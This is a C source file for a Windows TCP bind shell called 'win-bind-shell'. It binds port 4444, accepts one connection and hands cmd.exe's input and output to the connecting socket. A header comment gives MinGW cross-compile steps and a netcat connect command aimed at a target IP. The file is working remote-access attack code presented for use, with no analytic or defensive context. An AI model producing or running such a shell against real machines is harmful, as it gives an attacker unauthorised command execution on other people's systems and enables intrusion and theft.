#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

/*
 * win-bind-shell - Windows TCP Bind Shell
 *
 * Cross-compile:
 *   x86_64-w64-mingw32-gcc main.c -o bind_shell.exe -lws2_32
 *
 * Connect:
 *   nc <target_ip> 4444
 */

// -- CONFIGURE --------------------------------------------
#define BIND_PORT 4444
// ---------------------------------------------------------

int main(void) {
    WSADATA wsa;
    SOCKET listen_sock, client_sock;
    struct sockaddr_in server, client;
    int client_len = sizeof(client);
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    listen_sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(BIND_PORT);

    bind(listen_sock, (struct sockaddr *)&server, sizeof(server));
    listen(listen_sock, 1);

    printf("[*] Listening on port %d...\n", BIND_PORT);
    client_sock = accept(listen_sock, (struct sockaddr *)&client, &client_len);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client_sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);

    closesocket(client_sock);
    closesocket(listen_sock);
    WSACleanup();
    return 0;
}
